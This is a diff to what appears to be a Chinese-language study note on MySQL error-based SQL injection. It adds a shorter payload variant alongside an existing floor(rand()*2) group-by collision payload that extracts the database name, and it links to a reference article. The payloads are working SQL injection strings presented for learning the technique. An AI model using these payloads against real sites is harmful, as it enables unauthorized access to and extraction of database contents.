@@ -79,6 +79,8 @@ floor(), rand()
 group by
 **/
 ?id = 1' union select count(*),1,concat((select database()),'~',floor(rand()*2))as a from information_schema.schemata group by a--+
+// 當我們清楚原理之後，也可以改成:
+?id = 1' or 1=1 group by concat(database(),floor(rand()*2)) having min(0)--+
 ```
 ```floor(rand()x2)``` 為穩定序列，造成```group by key```的碰撞! (非常推薦以下文章
 [The recommended aticle](http://dogewatch.github.io/2017/02/27/mysql-Error-Based-Injection/)
